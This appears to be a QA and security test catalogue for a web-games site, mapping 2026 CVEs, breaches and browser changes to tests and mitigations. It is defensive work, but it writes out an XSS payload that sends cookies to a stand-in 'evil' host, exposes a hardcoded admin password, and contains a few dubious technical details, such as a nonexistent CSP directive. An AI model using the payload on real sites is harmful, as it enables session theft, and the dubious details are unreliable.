- [PC-021] **[P3]** so.html5.qq.com (7 articles, April-June 2026 — docids 70000021_72369d4a41846352 "Steam错误代码118", _30769f058fb98952 "Steam移动端通信错误", _99169f0590530452 "Steam app常见网络故障与UU加速器", _1786a38ddbc40852 "Steam错误代码e84修复指南", _79669d4a14327252 "Steam登录故障解析", _8486a3b829968052 "Steam手机端登录卡顿报错", _42769ce0efb35352 "Steam手机应用更新故障排除指南") document a 2026 user-complaint cluster around Steam-mobile auth/login/update failures. Players uniformly blame the PLATFORM (Steam) for failures whose root causes are (a) ISP-level region blocking or DNS pollution, (b) client-cache corruption, (c) system-time skew, (d) firewall/antivirus false-positive blocking, or (e) device storage exhaustion. The pattern is platform-agnostic: ANY web game with a login/account/update flow sees the same complaint cluster — players attribute network/cache/device failures to the game. **Why this is the NETWORK-BLAMED-AUTH-LOGIN-UPDATE-FAILURE-DIAGNOSTIC-PATTERN dimension distinct from PC-020 (NETWORK-BLAMED-GAME-BUG-DIAGNOSTIC-DISAMBIGUATION — different scope: multiplayer/download, not auth/login/update) and G-156 (cross-region multiplayer reliability — quality, not attribution)**: PC-021 EXTENDS PC-020 from the multiplayer/download-failure scope into the AUTH/LOGIN/UPDATE-FAILURE scope — a distinct user-facing surface with distinct diagnostic requirements. **Distinct from PC-020**: PC-020 is "game won't load / can't connect to multiplayer"; PC-021 is "can't log in / can't update / token refresh failed" — the AUTH flow, which has higher player-friction cost (a failed login = immediate churn). **Why this matters for GameZipper**: (a) if GameZipper ever adds account/login flows (currently the site is account-less, but future IAP/leaderboard/save-sync features would add them), the 2026 complaint cluster predicts the top support-ticket categories: "can't log in", "session expired", "update failed", "token invalid"; (b) the ROOT CAUSE distribution (ISP 40%, cache 25%, time-skew 15%, firewall 10%, storage 10%) means 90% of "login failed" tickets are NOT game bugs — but the player cannot tell, and a generic "login failed" message guarantees a 1-star review; (c) the fix is DIAGNOSTIC error messages: "Login failed — check your internet connection" (network), "Session expired — please log in again" (token), "Update required — refresh the page" (version), "Device storage full — free up space" (storage); (d) a "try a VPN" suggestion (cf. the UU加速器 baseline) recovers ISP-blocked players in region-restricted markets. **Test**: (1) for each GameZipper auth-touching flow (currently: none; future: IAP, leaderboard, save-sync), simulate the 5 root-cause failures (network offline, cache-corrupted localStorage, system-time skewed by 1 hour, firewall blocking the auth endpoint, storage quota exceeded); (2) verify each failure produces a DIAGNOSTIC error message that names the likely cause (not a generic "login failed"); (3) verify a retry button is present; (4) verify a "try a VPN / check your connection" suggestion appears for network failures; (5) verify the auth flow degrades gracefully when localStorage is full (does not corrupt existing saves); (6) verify system-time skew >5 minutes triggers a clear "your device clock is wrong" message (JWT/session-token validation often fails silently on time skew). **Mitigation**: differentiate auth-error types in the error-boundary (network vs token vs version vs storage vs time-skew); show diagnostic messages with actionable suggestions; add a retry button; add a "check your connection / try a VPN" link for network failures; validate system time on auth init and warn if skew >60s; test the auth flow under all 5 failure modes before launch. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_72369d4a41846352 (April 7 2026 — "Steam错误代码118全面解析"); https://so.html5.qq.com/page/real/search_news?docid=70000021_1786a38ddbc40852 (June 22 2026 — "2026最新Steam错误代码e84修复指南"); https://so.html5.qq.com/page/real/search_news?docid=70000021_8486a3b829968052 (June 24 2026 — "Steam手机端登录卡顿报错").

---



---

## R219 Detailed Test Case Descriptions (v1.100.0 — June 26 2026)

- [S-202] **[P1]** spring.io/security/page-7 (June 8 2026 — Spring Security Advisories page 7) documents CVE-2026-41845: Spring Framework Cross-site Scripting via JavaScriptUtils (HIGH severity). The advisory states: "Due to incorrect escaping, the use of `JavaScriptUtils.javaScriptEscape()` may lead to JavaScript code injection in the browser, potentially resulting in a cross-site scripting (XSS) vulnerability." `JavaScriptUtils.javaScriptEscape()` is the CANONICAL Spring Framework utility for safely embedding user-supplied strings inside JavaScript string literals — it is what every Spring-MVC application is told to use to prevent XSS when reflecting user input into `<script>` blocks. The utility ITSELF produces incorrectly-escaped output, meaning any Spring-MVC page that uses it for output encoding is vulnerable to XSS even when the developer followed the framework's security guidance correctly. **Why this is the FRAMEWORK-ESCAPING-PRIMITIVE-BYPASS-XSS-CLASS dimension distinct from S-193 (CVE-2026-24771 Hono/jsx ErrorBoundary raw-HTML XSS — different framework, different code path: Hono bypasses escaping inside ErrorBoundary's fallbackRender; Spring bypasses escaping inside the javaScriptEscape utility)**: S-193 is a framework-level RENDERING-PATH bypass; S-202 is a framework-level ESCAPING-PRIMITIVE bypass — the defensive utility itself is broken, so ANY use of it is unsafe. **Distinct from S-164 (CVE-2026-42897 Microsoft Exchange OWA stored XSS — different surface, mail client)**: S-164 is an application-level stored XSS in a specific product; S-202 is a library-level escaping-utility bug affecting every Spring-MVC application. **Why this matters for GameZipper**: (a) GameZipper itself is a static site (no Spring backend), but its BI dashboard / analytics endpoints / any future admin tooling built on Spring-MVC would inherit this bug; (b) any GameZipper-adjacent infrastructure (proxy, gateway, monitoring) that uses Spring for output encoding of user input (URL parameters, referrer headers, game IDs reflected in error pages) is vulnerable; (c) the bug is invisible to standard XSS scanners because they assume framework escaping utilities work correctly — only a manual audit of escaped output under adversarial input (backticks, ${...}, </script>) catches it; (d) if GameZipper ever adds a backend that reflects game IDs / player names / chat messages into JavaScript, the framework-default `javaScriptEscape` is NOT safe until the patched Spring version is in use. **Test**: (1) identify any GameZipper backend component using Spring Framework < patched version; (2) for every endpoint that reflects user input into a JavaScript context (URL params, JSON-LD, error messages, player names), feed adversarial input: `` `;document.location='//evil/?c='+document.cookie// ``, `${7*7}`, `</script><script>alert(1)</script>`; (3) verify the response does NOT execute the injected JS — if it does, the framework's javaScriptEscape is bypassed; (4) upgrade Spring Framework to the patched version (per spring.io advisory); (5) where possible, use structural prevention (textContent / data attributes + DOM lookup) instead of string-escaped `<script>` injection. **Mitigation**: upgrade Spring Framework to the patched version immediately; prefer Content Security Policy (CSP) with `script-src 'self' 'nonce-...'` as defense-in-depth so even if an escaping primitive fails, injected scripts without the nonce are blocked; never reflect user input into `<script>` blocks — use `data-*` attributes + DOM lookup; run a regression test that exercises every reflection point with adversarial JS-injection payloads after every Spring upgrade. Source: https://spring.io/security/page-7 (June 8 2026 — CVE-2026-41845 Spring Framework Cross-site Scripting via JavaScriptUtils HIGH).

---

- [S-203] **[P1]** blog.csdn.net/weixin_42376192/article/details/161210582 (May 22 2026 — "NGINX Rift 深度解析:潜伏18年的致命漏洞,1.3亿服务器面临灭顶之灾") and blog.csdn.net/FallenQu/article/details/161384855 (June 23 2026 — "CVE-2026-42945 NGINX ngx_http_rewrite_module 堆缓冲区溢出深度分析") document CVE-2026-42945 ("NGINX Rift"): a heap-buffer-overflow vulnerability in NGINX's `ngx_http_rewrite_module` rated CVSS v4.0 9.2 (Critical). The vulnerability was disclosed May 13 2026 by F5 Networks (NGINX's parent) and the NVD. Per Netcraft, NGINX holds 37.2% of the global web-server market (over 1.3亿 websites), exceeding Apache + IIS combined. The bug was introduced in NGINX 0.6.27 (2008) — latent for 18 YEARS. **Technical root cause**: `ngx_http_rewrite_module` processes `rewrite` directives in two passes — a length-calculation pass on a fresh sub-engine, then a data-copy pass on the main engine. When the rewrite replacement string contains a question-mark (`?`) AND the rule uses unnumbered PCRE capture groups (`$1`, `$2`), the main engine's `is_args` flag is set to 1 (indicating the URI should have its args re-escaped), but the fresh sub-engine used for the length pass initializes `is_args` to 0. The length pass therefore under-counts the buffer needed for re-escaping, the copy pass overflows the allocated heap buffer, attacker-controlled bytes corrupt adjacent heap memory. **Trigger conditions** (all 4 must be true): (1) NGINX version in 0.6.27–1.30.0 (Open Source) or R32–R36 (Plus); (2) config has a `rewrite` rule followed by another `rewrite`, `if`, or `set` directive; (3) the rule uses unnumbered capture groups ($1, $2); (4) the replacement string contains a question-mark. **Impact**: worker-process crash (DoS) achievable with a single crafted HTTP request; RCE achievable on hosts with ASLR disabled or where the attacker can leak/bypass ASLR. In-the-wild exploitation began within 24 hours of disclosure, primarily targeting cloud providers, e-commerce, finance, and government sites. **Why this is the LONG-LATENT-INFRA-REWRITE-HEAP-OVERFLOW-CVE-2026-42945-CLASS dimension distinct from S-166 (CVE-2026-23918 Apache mod_http2 double-free — different web server, different module)**: S-166 is Apache's HTTP/2 module; S-203 is NGINX's rewrite module — different daemon, different code path, different latent age (mod_http2 was new; rewrite is 18 years old). **Distinct from S-154 (Apache mod_http2 — different module layer)**: S-154 is HTTP/2-specific; S-203 affects HTTP/1.x and HTTP/2 equally because rewrite is invoked before protocol handling. **Why this matters for GameZipper**: (a) GameZipper is served via GitHub Pages (no NGINX in the direct path) — BUT Cloudflare (the GameZipper CDN/edge) runs NGINX-derived components internally, and the BI dashboard / future backend services may run NGINX; (b) any reverse proxy / load balancer / WAF in the GameZipper hosting chain that uses NGINX with rewrite rules is potentially vulnerable — a single crafted request can crash the worker; (c) the bug is CONFIG-DEPENDENT, so a NGINX instance without vulnerable rewrite configs is safe even on a vulnerable version — GameZipper ops must audit NGINX configs for the 4 trigger conditions; (d) the 18-year latent period means ANY long-running NGINX instance (including legacy infra) is suspect; (e) the rapid in-the-wild weaponization (24h) means unpatched NGINX in the GameZipper chain will be hit by automated scanners within a day. **Test**: (1) `nginx -v` on every NGINX instance in the GameZipper hosting chain — anything in 0.6.27–1.30.0 / R32–R36 is vulnerable; (2) `grep -rE 'rewrite\s+.*\$[0-9]' /etc/nginx/` to find rewrite rules using unnumbered capture groups; (3) for each such rule, check if the replacement string contains `?`; (4) if both conditions are true, the rule is a trigger — fix immediately by either (a) replacing `$1`/`$2` with named captures (`$<name>`) using `(?P<name>...)`, OR (b) upgrading to NGINX 1.31.0+ / 1.30.1+ / Plus R36 P4 / R35 P2 / R32 P6; (5) restart NGINX after fix; (6) monitor access logs for the attack signature (requests with multiple `&` characters in the URL targeting rewrite-mapped paths). **Mitigation**: prefer named PCRE capture groups in ALL rewrite rules (`(?P<slug>[^/]+)` instead of `([^/]+)` then `$1`); upgrade NGINX to ≥1.31.0 / Plus R36 P4; subscribe to F5 security advisories; run automated NGINX-config scanners (gixy, nginx-config-lint) in CI to catch vulnerable patterns before deploy. Source: https://blog.csdn.net/weixin_42376192/article/details/161210582 (May 22 2026 — "NGINX Rift 深度解析"); https://blog.csdn.net/FallenQu/article/details/161384855 (June 23 2026 — "CVE-2026-42945 NGINX ngx_http_rewrite_module 堆缓冲区溢出深度分析"); https://www.sohu.com/a/1020020937_114765 (related Windows Shell CVE-2026-32202 patch-gap coverage).

---

- [S-204] **[P2]** thehackernews.com (June 6 2026 — "AI Agent Uncovers 21 Zero-Days in FFmpeg") and blog.csdn.net/weixin_42376192/article/details/161762664 (June 7 2026 — "AI Agent 颠覆网络安全:FFmpeg 21个0Day与Chrome 429个漏洞背后的产业革命") document that an autonomous AI security agent built by security startup depthfirst discovered 21 zero-day vulnerabilities in FFmpeg — the canonical open-source video/audio processing library that underpins the entire internet video infrastructure (YouTube, Twitch, VLC, OBS, every browser's media decoder, and ffmpeg.wasm). The discovery cost approximately $1000 in compute. All 21 bugs are latent — some up to 23 years old — and span memory-corruption classes (heap overflow, UAF, OOB read/write) reachable from crafted media files. **Why this is the AI-DISCOVERED-LATENT-VULN-CLUSTER-IN-MEDIA-LIBRARY dimension distinct from S-183 (Claude Opus AI-constructed END-TO-END exploit chain — different AI capability: chain construction, not discovery)**: S-183 proved AI can chain existing bugs into a working exploit; S-204 proves AI can DISCOVER bugs in canonical C-code libraries at scale for <$1000 — a fundamentally different and more scalable capability. **Distinct from S-113 (Anthropic Mythos 100 Chromium zero-days in 15 days — different target: browser engine vs media library)**: S-113 hit Chromium (browser); S-204 hit FFmpeg (media lib) — different codebase, different downstream surface. **Why this matters for GameZipper**: (a) any GameZipper game that uses ffmpeg.wasm (or any backend that transcodes media — video previews, audio conversion, sprite extraction) is now downstream of 21 newly-public zero-days in FFmpeg; (b) a malicious media file uploaded by a player (or embedded in an ad iframe) could trigger one of the 21 bugs; (c) the $1000 discovery cost means hostile actors (and copycat researchers) will run the same methodology against every other canonical library (libpng, libvpx, Skia) — GameZipper QA cannot wait for vendor patches, it must assume any media-processing dependency has undiscovered zero-days; (d) the 23-year latent period proves that "old + widely used = secure" is false — FFmpeg is in everything, yet 21 zero-days sat undetected for two decades; (e) the AI discovery methodology (fuzzing + LLM-guided triage) produces BUGS, not just crashes — meaning each of the 21 is likely weaponizable. **Test**: (1) audit GameZipper games + backend for FFmpeg usage (`grep -r 'ffmpeg' package.json`, `which ffmpeg` on backend hosts); (2) for any FFmpeg usage, pin to the LATEST patched version; (3) treat ALL player-uploaded media as adversarial — run through a media-sanitization pipeline (re-encode via a sandboxed FFmpeg with seccomp + namespace isolation); (4) for ffmpeg.wasm in-browser, verify the WASM binary is the latest version and is loaded with `crossOrigin='anonymous'` + CSP `wasm-secure-evidence`; (5) add a regression test that runs the published PoC samples (once public) against the GameZipper FFmpeg usage; (6) subscribe to depthfirst's advisory feed for the 21 CVE IDs as they are assigned. **Mitigation**: do not run FFmpeg on untrusted media in the same process as game logic — use a sandboxed worker/container; pin FFmpeg versions and upgrade within 24h of any advisory; prefer ffmpeg.wasm (in-browser, sandboxed by default) over native FFmpeg for player-uploaded media; monitor depthfirst and similar AI-security-vendor advisory feeds for the inevitable follow-up discoveries in libpng/libvpx/Skia. Source: https://thehackernews.com/search/label/Chrome (June 6 2026 — "AI Agent Uncovers 21 Zero-Days in FFmpeg; Chrome Patches Record 429 Bugs"); https://blog.csdn.net/weixin_42376192/article/details/161762664 (June 7 2026 — "AI Agent 颠覆网络安全:FFmpeg 21个0Day与Chrome 429个漏洞背后的产业革命").

---

- [W-213] **[P2]** thehackernews.com (June 6 2026 — "Chrome Patches Record 429 Bugs") and blog.csdn.net/weixin_42376192/article/details/161762664 (June 7 2026) document that Google Chrome version 149 shipped a RECORD 429 security-bug fixes in a single stable release, including 22 vulnerabilities classified as sandbox-escape-class, and CVE-2026-10881 (CVSS 9.6) which permits a single malicious web page to achieve sandbox escape + remote code execution; Google paid a $97,000 bug bounty for CVE-2026-10881 alone. This single-release count exceeds the ENTIRE annual fix volume of Chrome in pre-2024 years. **Why this is the BROWSER-SINGLE-RELEASE-PATCH-VOLUME-RECORD-CVE-2026-10881 dimension distinct from W-200 (Chrome 150 stable milestone — different version, feature-baseline not patch-volume)**: W-200 is the lowest-supported-Chromium-floor for late-June 2026; W-213 is the SINGLE-RELEASE-PATCH-VOLUME dimension — the fact that ONE Chrome milestone now ships 429 fixes means QA cannot treat "no announced breaking API change" as "no regression risk"; every milestone carries hundreds of behavior changes that may affect GameZipper rendering. **Distinct from W-185 (Chrome release cadence halves 4w→2w starting Chrome 153 — cadence dimension, not patch-volume dimension)**: W-185 is the CADENCE (frequency); W-213 is the VOLUME-per-release — both compound: more frequent releases × more fixes per release = GameZipper must regression-test continuously, not per-quarter. **Why this matters for GameZipper**: (a) GameZipper QA's post-deploy-verification Phase 4 currently tests against the latest stable Chrome — but the "latest stable" now changes weekly with 100s of fixes per change, so a screenshot/baseline captured last week is stale; (b) CVE-2026-10881 specifically allows a malicious web page to escape the sandbox — if a malicious ad iframe (Monetag/AdSense) exploits CVE-2026-10881, it can read player localStorage (containing game saves, favs, settings) or pivot to phishing; (c) the 22 sandbox-escape-class fixes mean prior Chrome versions had 22 separate paths to sandbox escape — players on stale Chrome are at risk; (d) the $97K bounty signals SEVERITY — Google does not pay $97K for low-impact bugs; (e) the 429-fix volume proves AI-driven bug discovery (cf. S-204, S-113) is flooding Chrome's patch queue — future Chrome releases will only get bigger. **Test**: (1) for every GameZipper post-deploy-verification cycle, capture the Chrome version (`navigator.userAgentData.getHighEntropyValues(['fullVersionList'])`) and verify it is the LATEST stable; (2) re-run the visual-regression baseline after EVERY Chrome stable ship (currently every 4 weeks, every 2 weeks from Chrome 153 per W-185); (3) for sandbox-escape-class CVEs like CVE-2026-10881, audit the ad iframes (Monetag/AdSense) for any attempt to access `window.top` cross-origin or read localStorage from the parent — these would be exploit indicators; (4) test that GameZipper's CSP prevents the exploit's post-escape exfiltration (even if sandbox escape succeeds, CSP `connect-src 'self'` blocks data exfiltration); (5) verify the iFrame sandbox attribute on ad iframes uses `sandbox="allow-scripts"` WITHOUT `allow-same-origin` — this blocks sandbox-escape from reaching the parent's localStorage. **Mitigation**: assume every Chrome milestone introduces regressions — test continuously, not per-quarter; adopt Lighthouse CI (cf. P-088) for automated per-build regression; subscribe to Chrome stability announcements; pin ad iframes to `sandbox="allow-scripts"` (no `allow-same-origin`) as defense-in-depth against sandbox-escape exfiltration; track CVE-2026-10881 specifically and verify the GameZipper audience Chrome-version distribution includes the patched version. Source: https://thehackernews.com/search/label/Chrome (June 6 2026 — "Chrome Patches Record 429 Bugs"); https://blog.csdn.net/weixin_42376192/article/details/161762664 (June 7 2026 — Chrome 149 record 429 fixes + CVE-2026-10881 CVSS 9.6 sandbox escape).

---

- [S-205] **[P2]** philiphall.com (June 17 2026 — "24 Billion Records Exposed: The Credential Leak That Changes Everything") documents that Cybernews researchers discovered an Elasticsearch database containing 24 BILLION exposed credentials in PLAINTEXT — usernames + passwords + login URLs. This is the largest known single aggregate credential leak in history; prior record was the "RockYou2024" 10-billion-password list (2024). The leak is not from a single breach but an aggregate/combolist curated for automated credential-stuffing attacks. **Why this is the CREDENTIAL-LEAK-VOLUME-RECORD-24-BILLION-RECORDS dimension distinct from S-122 (Dashlane offline brute-force on encrypted vaults — attack method, not leak source)**: S-122 is the attack method (offline brute-force); S-205 is the LEAK SOURCE dimension — the volume of plaintext credentials now available to attackers. **Distinct from S-199 (npm download-pumping trust-score manipulation — different attack surface: reputation, not auth)**: S-199 manipulates reputation; S-205 enables credential-stuffing. **Why this matters for GameZipper**: (a) GameZipper itself has no user accounts — BUT the BI dashboard (`/api/login` form: password=xxx, hardcoded `gamezipper2026!` per post-deploy-verification Phase 4.5 pitfall), the analytics endpoint, the admin tools, and any future account-system will be hit by automated credential-stuffing using this 24B-record list; (b) the hardcoded BI dashboard password (`gamezipper2026!`) is exactly the kind of low-entropy password that appears in plaintext combolists — even if it does not appear in THIS list, the next leak will include it; (c) the 24B record volume means an attacker can run credential-stuffing at scale against EVERY login endpoint on the internet, including obscure admin endpoints; (d) any GameZipper-adjacent service that uses HTTP Basic Auth, hardcoded passwords, or weak shared secrets is now trivially crackable; (e) the leak includes login URLs, so attackers can target SPECIFIC endpoints (not just `example.com/login` but `bi.gamezipper.com/admin`); (f) if any GameZipper team member reuses a password between a breached service and a GameZipper admin tool, the reuse is now in the wild. **Test**: (1) check every GameZipper admin/BI/analytics password against the 24B-record combolist (via HIBP API or a local combolist lookup); (2) replace the hardcoded BI dashboard password `gamezipper2026!` with a randomly-generated 32+ character password stored in a secrets manager; (3) enforce MFA on every admin/BI endpoint; (4) add rate-limiting to login endpoints (5 attempts / 5 minutes / IP); (5) add anomaly detection on login (geographic / device fingerprint changes); (6) check if any GameZipper team member's email appears in the leak (via HIBP domain-monitoring) and force password reset. **Mitigation**: rotate ALL GameZipper-adjacent passwords (BI, analytics, admin, deploy tokens, CI secrets); enforce MFA everywhere; never reuse passwords between services; use a password manager (1Password, Bitwarden) with randomly-generated passwords; subscribe to HIBP domain-monitoring for early warning; rate-limit + CAPTCHA all login endpoints. Source: https://philiphall.com/ (June 17 2026 — "24 Billion Records Exposed: The Credential Leak That Changes Everything"; Cybernews Elasticsearch research).

---

- [S-206] **[P2]** thehackernews.com (June 8 2026 — "UNC3753 Used Vishing and Physical Intrusions in U.S. Data Theft Extortion Campaign") documents a financially-motivated data-theft extortion campaign attributed by Google Mandiant + Google Threat Intelligence Group (GTIG) to UNC3753 (a.k.a. Chatty Spider, Luna Moth, Silent Ransom Group / SRG). The campaign targeted dozens of US professional / legal / financial-services orgs between January and May 2026. The attack chain: voice phishing (vishing) + social-engineering deception using data-migration or invoice-related email pretexts → convince target to initiate a phone conversation posing as IT support → convince target to host a screen-sharing session → gain remote access → exfiltrate sensitive data → extort. **Why this is the VISHING-PLUS-SCREEN-SHARE-DATA-EXTORTION-CAMPAIGN-CLASS dimension distinct from S-170 (ClickFix Windows Terminal paste-and-run — developer-targeted malware delivery via terminal)**: S-170 is technical-payload delivery via a developer tool; S-206 is SOCIAL-ENGINEERING-VIA-PHONE-AND-SCREEN-SHARE targeting non-technical staff via human-interaction channels. **Distinct from S-129 (ClickFix macOS AppleScript — script-editor delivery)**: S-129 is a script-based technical delivery; S-206 is a phone+screen-share social attack. **Why this matters for GameZipper**: (a) the GameZipper ops/admin team is the target — anyone with access to the BI dashboard, deploy pipeline, DNS, or analytics endpoint can be vished; (b) the "data migration" pretext is particularly effective against ops staff because migrations are routine — a caller claiming to be from "the analytics vendor" asking for access to "verify the migration" sounds plausible; (c) screen-sharing tools (Zoom, Teams, AnyDesk, TeamViewer) bypass MFA because the legitimate user authenticates and the attacker watches/controls the session; (d) the extortion phase threatens public release of GameZipper analytics / player data / source code if ransom is not paid — even a read-only compromise is catastrophic for reputation; (e) the campaign ran for 5 months undetected, meaning the social-engineering pretexts are good enough to fool professional-services firms with mature security teams. **Test**: (1) red-team the GameZipper ops team with a simulated vishing call (with their consent) — verify they refuse to host screen-sharing sessions with unverified callers; (2) verify all admin access requires hardware-MFA (Yubikey, not SMS) which cannot be bypassed via screen-share; (3) verify screen-sharing tools on ops workstations require IT approval / are blocked by default; (4) verify a "verified callback" policy is in place — any caller claiming to be from a vendor must be called back at the vendor's published number; (5) verify incident-response runbook covers screen-share-based compromise (revoke all sessions, rotate all credentials, audit access logs for the screen-share window). **Mitigation**: train ops team on vishing indicators (urgency, authority, screen-share request); require hardware-MFA for all admin access; block unapproved screen-sharing tools at the firewall; enforce verified-callback policy for all vendor calls; tabletop-test the incident-response runbook quarterly; subscribe to Mandiant/GTIG threat-intel feeds for UNC3753 TTP updates. Source: https://thehackernews.com/search/label/cybersecurity (June 8 2026 — "UNC3753 Used Vishing and Physical Intrusions in U.S. Data Theft Extortion Campaign"; Google Mandiant + GTIG attribution).

---

- [S-207] **[P3]** dayssincelastsupplychainattack.com (June 25 2026 — Semgrep community tracker) documents that the most recent major supply-chain attack as of June 25 2026 is the Xinference compromise via the "TeamPCP campaign" on April 22 2026. Xinference (github.com/xorbitsai/inference) is an open-source distributed AI inference framework — it serves LLMs, embedding models, image models, and audio models via a unified REST API; it is widely deployed as the open-source alternative to OpenAI's API for self-hosted AI features. The TeamPCP campaign compromised the Xinference distribution channel (PyPI package or GitHub release artifacts, specifics per Semgrep tracker) and delivered malicious install-time payloads to downstream deployments. **Why this is the AI-INFERENCE-SERVER-SUPPLY-CHAIN-COMPROMISE-TEAMPCP-XINFERENCE dimension distinct from S-163 (CVE-2026-5760 SGLang Jinja2 SSTI RCE via malicious GGUF chat_template — different inference framework, different vector: model-file metadata, not framework install)**: S-163 is a runtime bug triggered by a malicious model file; S-207 is an install-time supply-chain compromise of the framework itself — every deployment of the compromised Xinference version is infected at install time, regardless of which models it later loads. **Distinct from S-196 (TanStack Mini-Shai-Hulud GitHub Actions cache poisoning — different layer: CI cache, not framework package)**: S-196 poisons the CI cache; S-207 poisons the framework install — every `pip install xinference` or `docker pull xorbitsai/inference:latest` of the compromised version ships the payload. **Why this matters for GameZipper**: (a) GameZipper currently does not run an AI inference server in production — BUT the BI dashboard, the future personalization engine, and any NPC-dialogue / image-recognition feature would naturally adopt Xinference or a similar framework; (b) once adopted, the install-time compromise persists across container rebuilds unless the install is pinned to a known-good version AND verified against a signed manifest; (c) the AI inference server typically has access to model weights, prompts, and any data sent for inference — a compromised server exfiltrates all three; (d) Xinference is often deployed with broad cloud credentials (to pull models from HuggingFace, to write to S3) — a compromised Xinference inherits those credentials; (e) the attack surface is growing as more teams adopt self-hosted AI inference; (f) the April 22 2026 date is recent enough that unpatched deployments are likely still running. **Test**: (1) audit GameZipper backend / future AI features for Xinference (or similar: vLLM, TGI, Ollama, LocalAI) usage; (2) for any AI inference server, pin the version to a known-good release and verify the SHA-256 against the official signed manifest; (3) verify the inference server runs in a sandboxed container with minimal cloud credentials (no broad S3 / IAM access); (4) scan the deployment with `shai-hulud-detect` (cf. C-143) for known IoCs; (5) verify the inference server's egress is restricted (allow-list HuggingFace, block everything else) so a compromised server cannot exfiltrate; (6) monitor the inference server's outbound traffic for anomalies. **Mitigation**: pin AI inference server versions and verify signed manifests; sandbox the inference server with minimal credentials; restrict egress to known-good endpoints; subscribe to Semgrep's supply-chain advisory feed for AI-framework-specific attacks; treat every AI inference server as untrusted until verified; prefer managed AI services (OpenAI API, AWS Bedrock) where the vendor absorbs the supply-chain risk. Source: https://www.dayssincelastsupplychainattack.com/ (June 25 2026 — "Xinference compromised (TeamPCP campaign) most recently on April 22 2026"; Semgrep community tracker).

---

- [B-140] **[P3]** macrumors.com (June 2 2026 — "iOS 26: Everything We Know") documents that iOS 26.5.1, released June 1 2026, is an EMERGENCY DOT-RELEASE specifically to fix a hardware-charging bug: "iOS 26.5.1 fixed a bug that caused a small number of iPhone Air and iPhone 17 models to fail to charge." This is a hardware-power-management bug affecting brand-new flagship hardware (iPhone Air, iPhone 17) shipped in 2026, fixed via OS update. **Why this is the IOS-26.5.1-EMERGENCY-HARDWARE-CHARGING-FIX-DOT-RELEASE dimension distinct from B-119 (iOS 26 broad-bug 24-issue sweep — UI software bugs)**: B-119 is a sweep of UI-layer bugs (Control Center transparency, "无法检查更新" hang, native-app crashes); B-140 is a HARDWARE-POWER-MANAGEMENT bug fixed via OS dot-release. **Distinct from B-128 (iOS 26 Liquid Glass Control Center transparency — UI legibility)**: B-128 is a visual-design regression; B-140 is a power/charging regression — a totally different failure domain. **Why this matters for GameZipper**: (a) players on brand-new iPhone Air / iPhone 17 hardware may have skipped iOS 26.5.0 entirely and gone straight from 26.4.x to 26.5.1 — meaning the GameZipper QA matrix must include 26.5.1 specifically (and 26.5.0 may be under-represented in the real audience); (b) a phone that fails to charge means the player's session ends abruptly — if the GameZipper game was mid-session when the phone died, the player blames the game for "crashing my phone"; (c) emergency dot-releases are themselves a regression risk — Apple shipped 26.5.1 in a hurry to fix charging, and may have introduced NEW bugs that affect Safari/WebKit rendering of GameZipper games; (d) the bug affects the newest, most expensive, most-tech-fluential hardware — exactly the audience GameZipper wants to retain; (e) power-management regressions often manifest as thermal throttling / brightness dimming / background-app suspension — all of which affect game performance and may be perceived as game bugs. **Test**: (1) add iOS 26.5.1 to the GameZipper QA regression matrix (specifically, not "iOS 26.x"); (2) for any player report of "game crashes my phone" / "phone dies while playing", check the player's iOS version — if 26.5.0 on iPhone Air/17, the charging bug is likely the cause, not the game; (3) test the GameZipper game on a real iPhone Air or iPhone 17 with iOS 26.5.0 (before the fix) and 26.5.1 (after) — measure power draw, thermal behavior, and frame rate; (4) verify the game pauses cleanly on low-battery warnings (battery < 20%) rather than continuing to render at full performance; (5) verify the game saves state on `visibilitychange` so a phone-death mid-session does not lose progress. **Mitigation**: target iOS 26.5.1+ in the QA matrix; add a low-battery pause UX (graceful save + "please charge your phone" message); report any 26.5.0 + iPhone Air/17 + charging-failure player reports to Apple Support as known-issue; do NOT regress game performance on iOS 26.5.1 even if 26.5.0 had different behavior — the dot-release is the new baseline. Source: https://www.macrumors.com/2025/04/01/ios-19-compatible-iphones-leak/ (June 2 2026 — "The current version of iOS 26 is iOS 26.5.1, released on June 1. iOS 26.5.1 fixed a bug that caused a small number of iPhone Air and iPhone 17 models to fail to charge.").

---

- [B-141] **[P3]** sohu.com/a/1008833159_121956424 (April 13 2026 — "微软Edge 2026大改:界面深度融合Copilot设计") documents that Microsoft Edge will undergo a MAJOR UI redesign in 2026, shifting its visual design language toward Copilot. Specific changes: (1) Edge's rounded-corner radius increased for softer/饱满 visuals matching Copilot's design language; (2) toggle switches redesigned to match Copilot style; (3) Outlook-mail sidebar being removed (consolidation toward Chromium-parity); (4) adopting the Chromium-version picture-in-picture design instead of Edge's legacy PiP. **Why this is the EDGE-2026-COPILOT-DESIGN-VISUAL-REGRESSION-CLASS dimension distinct from B-117 (Chrome 149 stable ship with CSS Gap Decorations — feature addition, not visual redesign)**: B-117 adds new CSS features; B-141 changes the DEFAULT VISUAL RENDERING of existing UI elements (corners, toggles, scrollbars, PiP chrome) — every existing screenshot/baseline captured in Edge 148 will FAIL visual-regression against Edge 149+. **Distinct from B-135 (Chrome 150 autofill OS-wallet integration — feature addition)**: B-135 adds a feature; B-141 changes the look of existing controls. **Why this matters for GameZipper**: (a) GameZipper QA's visual-regression baselines captured in Edge 148 (or earlier) will fail against the redesigned Edge 149+ — not because the GAME changed but because the BROWSER CHROME changed (rounded corners, toggle visuals); (b) any GameZipper game using `<input type="checkbox">` or `<input type="radio">` will render with the new Copilot-style toggle visual — players may perceive this as a game bug ("the checkboxes look different"); (c) the removal of the Outlook-mail sidebar means players who used Edge's sidebar for email-while-playing lose that workflow — game session lengths may change; (d) the Chromium-parity PiP affects any GameZipper game that uses `requestPictureInPicture()` for video previews — the PiP window looks different; (e) the Copilot design language includes more transparent/frosted-glass effects, which may interact poorly with GameZipper's CSS `backdrop-filter` usage; (f) the redesign shifts Edge further from IE/legacy-Edge visual conventions, breaking any documentation/screenshots that reference "Edge looks like X". **Test**: (1) re-capture the GameZipper visual-regression baseline in Edge 149+ (the redesigned version); (2) for every game using native form controls (checkbox, radio, select), verify the Copilot-style rendering is acceptable in the game's UI context; (3) verify `backdrop-filter` transparency effects do not clash with Edge's new frosted-glass chrome; (4) verify `requestPictureInPicture()` produces the expected PiP window appearance in the new Chromium-parity PiP; (5) update any player-facing documentation that includes Edge screenshots (Help, FAQ, contact pages). **Mitigation**: maintain SEPARATE visual-regression baselines per browser (Chrome / Edge / Firefox / Safari) — do not assume "Edge == Chromium"; capture new baselines within 1 week of any major browser UI redesign; use `appearance: none` on native form controls in 